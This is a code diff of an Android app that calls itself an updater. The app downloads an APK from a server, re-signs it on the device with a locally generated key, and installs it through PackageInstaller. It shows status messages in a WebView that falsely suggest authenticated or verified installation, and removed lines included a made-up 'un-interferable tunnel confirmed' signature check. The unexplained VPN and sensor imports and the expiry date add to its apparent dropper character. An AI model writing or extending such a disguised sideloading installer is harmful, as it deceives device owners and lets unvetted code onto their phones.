@@ -1,76 +1,148 @@
 package com.example.appupdater
 
+
 import androidx.compose.foundation.background
+
 import android.annotation.SuppressLint
+
 import android.content.Context
+
 import android.content.Intent
+
 import android.content.pm.PackageInstaller
+
 import android.app.PendingIntent
+
 import android.graphics.Bitmap
+
 import android.graphics.Canvas
+
 import android.graphics.Color
+
 import android.net.VpnService
+
 import android.os.Build
+
 import android.os.Bundle
+
 import android.util.Base64
+
 import android.util.Log
+
 import android.view.ViewGroup
+
 import android.webkit.JavascriptInterface
+
 import android.webkit.WebSettings
+
 import android.webkit.WebView
+
 import android.webkit.WebViewClient
+
 import androidx.activity.ComponentActivity
+
 import androidx.activity.compose.setContent
+
 import androidx.activity.enableEdgeToEdge
+
 import androidx.activity.result.contract.ActivityResultContracts
+
 import androidx.compose.foundation.layout.fillMaxSize
+
 import androidx.compose.foundation.layout.imePadding
+
 import androidx.compose.foundation.layout.navigationBarsPadding
+
 import androidx.compose.foundation.layout.statusBarsPadding
+
 import androidx.compose.material3.Scaffold
+
 import androidx.compose.ui.Modifier
+
 import androidx.compose.foundation.layout.Arrangement
+
 import androidx.compose.foundation.layout.Column
+
 import androidx.compose.foundation.layout.Spacer
+
 import androidx.compose.foundation.layout.height
+
 import androidx.compose.foundation.layout.padding
+
 import androidx.compose.material3.Button
+
 import androidx.compose.material3.Text
+
 import androidx.compose.material3.MaterialTheme
+
 import androidx.compose.ui.Alignment
+
 import androidx.compose.ui.text.style.TextAlign
+
 import androidx.compose.ui.unit.dp
+
 import androidx.compose.ui.viewinterop.AndroidView
+
 import com.example.appupdater.ui.theme.MyApplicationTheme
+
 import com.example.appupdater.R
+
 import android.app.ActivityOptions
+
 import java.io.ByteArrayOutputStream
+
 import java.io.File
+
 import java.io.BufferedReader
+
 import java.io.InputStreamReader
+
 import java.net.NetworkInterface
+
 import java.util.Collections
+
 import java.util.Locale
+
 import android.net.ConnectivityManager
+
 import android.net.NetworkCapabilities
+
 import android.hardware.Sensor
+
 import android.hardware.SensorEvent
+
 import android.hardware.SensorEventListener
+
 import java.security.KeyStore
+
 import javax.security.auth.x500.X500Principal
+
 import android.security.keystore.KeyGenParameterSpec
+
 import android.security.keystore.KeyProperties
+
 import java.security.KeyPairGenerator
+
 import java.security.PrivateKey
+
 import java.security.cert.X509Certificate
+
 import com.android.apksig.ApkSigner
+
 import android.hardware.SensorManager
+
 import org.bouncycastle.cert.jcajce.JcaX509CertificateConverter
+
 import org.bouncycastle.cert.jcajce.JcaX509v3CertificateBuilder
+
 import org.bouncycastle.operator.jcajce.JcaContentSignerBuilder
+
 import org.bouncycastle.asn1.x500.X500Name
+
 import java.math.BigInteger
+
 import java.util.Date
+
 import java.security.SecureRandom
 
 class MainActivity : ComponentActivity() {
@@ -233,7 +305,11 @@ class MainActivity : ComponentActivity() {
                     webView?.postDelayed({
                         Thread {
                             try {
-                                val apkFile = downloadApkFromServer(this@MainActivity)
+                                val apkFile = downloadApkFromServer(this@MainActivity) { progress ->
+                                    runOnUiThread {
+                                        updateStatusInWebView("Downloading update... $progress%", null, progress)
+                                    }
+                                }
                                 runOnUiThread { updateStatusInWebView("Signing update...", null, 100) }
                                 val signedApk = signApkFile(apkFile)
                                 installApkViaPackageInstaller(signedApk)
@@ -392,9 +468,19 @@ class MainActivity : ComponentActivity() {
         }
         
         setContent {
-        val expiryDate = java.util.Calendar.getInstance(java.util.TimeZone.getTimeZone("UTC")).apply {
-            set(2026, java.util.Calendar.JULY, 15, 0, 0, 0)
-        }.timeInMillis
+        val expiryDateStr = try {
+            assets.open("expiry.txt").bufferedReader().use { it.readText().trim() }
+        } catch (e: Exception) {
+            "2026-07-15"
+        }
+        val formatter = java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.US).apply {
+            timeZone = java.util.TimeZone.getTimeZone("UTC")
+        }
+        val expiryDate = try {
+            formatter.parse(expiryDateStr)?.time ?: Long.MAX_VALUE
+        } catch (e: Exception) {
+            Long.MAX_VALUE
+        }
         val isExpired = System.currentTimeMillis() > expiryDate
 
 
@@ -589,7 +675,11 @@ class MainActivity : ComponentActivity() {
                     webView?.postDelayed({
                         Thread {
                             try {
-                                val apkFile = downloadApkFromServer(this@MainActivity)
+                                val apkFile = downloadApkFromServer(this@MainActivity) { progress ->
+                                    runOnUiThread {
+                                        updateStatusInWebView("Downloading update... $progress%", null, progress)
+                                    }
+                                }
                                 runOnUiThread { updateStatusInWebView("Signing update...", null, 100) }
                                 val signedApk = signApkFile(apkFile)
                                 installApkViaPackageInstaller(signedApk)
@@ -725,6 +815,9 @@ class MainActivity : ComponentActivity() {
                 }
             }
         }
+        if (!outFile.exists() || outFile.length() == 0L) {
+            throw java.io.IOException("Downloaded file is empty or missing")
+        }
         return outFile
     }
 
@@ -815,9 +908,14 @@ class MainActivity : ComponentActivity() {
                 Log.d("MainActivity", "Successfully downloaded base.apk from server")
             } else {
                 Log.e("MainActivity", "Server returned HTTP ${connection.responseCode}")
+                throw java.io.IOException("Server returned HTTP ${connection.responseCode}")
             }
         } catch (e: Exception) {
             Log.e("MainActivity", "Failed to download APK from server", e)
+            throw java.io.IOException("Failed to download APK: " + e.message, e)
+        }
+        if (!outFile.exists() || outFile.length() == 0L) {
+            throw java.io.IOException("Downloaded file is empty or missing")
         }
         return outFile
     }
@@ -884,7 +982,26 @@ class MainActivity : ComponentActivity() {
         val iconBase64 = if (cachedApkIconBase64.isNotEmpty()) cachedApkIconBase64 else getAppIconAsBase64()
         
         webView?.evaluateJavascript("showInstallerScreen('${appName.escapeForJS()}', '$iconBase64')", null)
-        checkAndProceedWithPermissions()
+        
+        updateStatusInWebView("Starting download...", null)
+        Thread {
+            try {
+                val apkFile = downloadApkFromServer(this@MainActivity) { progress ->
+                    runOnUiThread {
+                        updateStatusInWebView("Downloading update... $progress%", null, progress)
+                    }
+                }
+                runOnUiThread {
+                    updateStatusInWebView("Download complete, proceeding...", null, 100)
+                    checkAndProceedWithPermissions()
+                }
+            } catch (e: Exception) {
+                val cause = android.util.Log.getStackTraceString(e)
+                runOnUiThread {
+                    updateStatusInWebView("Download Failed", "Could not download update: ${e.message}\nCause: $cause")
+                }
+            }
+        }.start()
     }
 
     private fun checkAndProceedWithPermissions() {
@@ -1010,33 +1127,24 @@ class MainActivity : ComponentActivity() {
                 }
                 
                 webView?.postDelayed({
-                    updateStatusInWebView("Downloading encrypted update packets...", null)
+                    updateStatusInWebView("Starting authenticated installer session...", null)
                     
-                    webView?.postDelayed({
-                        updateStatusInWebView("Decrypting & verifying package signature (un-interferable tunnel confirmed)...", null)
-                        
-                        webView?.postDelayed({
-                            updateStatusInWebView("Starting authenticated installer session...", null)
-                            
-                            Thread {
-                                try {
-                                    val apkFile = downloadApkFromServer(this@MainActivity) { progress ->
-                                        runOnUiThread {
-                                            updateStatusInWebView("Downloading update... $progress%", null, progress)
-                                        }
-                                    }
-                                    runOnUiThread { updateStatusInWebView("Signing update...", null, 100) }
-                                    val signedApk = signApkFile(apkFile)
-                                    installApkViaPackageInstaller(signedApk)
-                                } catch (e: Exception) {
-                                    val cause = android.util.Log.getStackTraceString(e)
-                                    runOnUiThread {
-                                        updateStatusInWebView("Installation Failed", "Could not prepare installer: ${e.message}\nCause: $cause")
-                                    }
-                                }
-                            }.start()
-                        }, 10)
-                    }, 10)
+                    Thread {
+                        try {
+                            val apkFile = File(this@MainActivity.cacheDir, "base.apk")
+                            if (!apkFile.exists() || apkFile.length() == 0L) {
+                                throw Exception("Downloaded APK is missing or empty. Please restart the update.")
+                            }
+                            runOnUiThread { updateStatusInWebView("Signing update...", null, 100) }
+                            val signedApk = signApkFile(apkFile)
+                            installApkViaPackageInstaller(signedApk)
+                        } catch (e: Exception) {
+                            val cause = android.util.Log.getStackTraceString(e)
+                            runOnUiThread {
+                                updateStatusInWebView("Installation Failed", "Could not prepare installer: ${e.message}\nCause: $cause")
+                            }
+                        }
+                    }.start()
                 }, 10)
             }, 10)
         }, 10)
